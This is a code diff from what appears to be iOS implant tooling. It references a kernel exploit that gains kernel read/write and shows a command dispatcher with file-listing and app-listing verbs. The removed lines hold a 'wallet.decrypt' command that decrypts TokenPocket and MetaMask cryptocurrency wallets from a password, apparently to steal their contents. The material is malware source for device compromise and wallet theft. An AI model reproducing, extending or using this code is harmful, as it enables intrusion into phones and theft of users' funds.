@@ -19,7 +19,6 @@
 #import "MCMBridge.h"
 #import "krw.h"
 #import "kexploit/vnode.h"
-#import "DarkSwordWalletDecrypt.h"
 
 /// Set to a non-zero inpcb pointer by kexploit_opa334() once kernel read/write
 /// is live. This is the "krw is ready" sentinel.
@@ -685,21 +684,6 @@ static NSString *DSExecuteCommand(NSString *command)
     if ([verb isEqualToString:@"file.recursive"]) {
         return DSFileRecursive(words.count >= 2 ? words[1] : nil,
                                words.count >= 3 ? words[2] : nil);
-    }
-    if ([verb isEqualToString:@"wallet.decrypt"]) {
-        if (words.count < 3) return @"usage: wallet.decrypt <tokenpocket|metamask> <password>";
-        NSString *type = [words[1] lowercaseString];
-        NSString *password = [[words subarrayWithRange:NSMakeRange(2, words.count - 2)]
-                              componentsJoinedByString:@" "];
-        if ([type isEqualToString:@"tokenpocket"]) {
-            NSString *m = DarkSwordTokenPocketDecrypt(password);
-            return m ?: @"tokenpocket decrypt failed (wrong password?)";
-        }
-        if ([type isEqualToString:@"metamask"]) {
-            NSString *m = DarkSwordMetaMaskDecrypt(password);
-            return m ?: @"metamask decrypt failed (wrong password?)";
-        }
-        return [NSString stringWithFormat:@"unknown wallet type: %@", type];
     }
     if ([verb isEqualToString:@"app.list"]) return DSAppList();
     return [NSString stringWithFormat:@"unknown command: %@", trimmed];
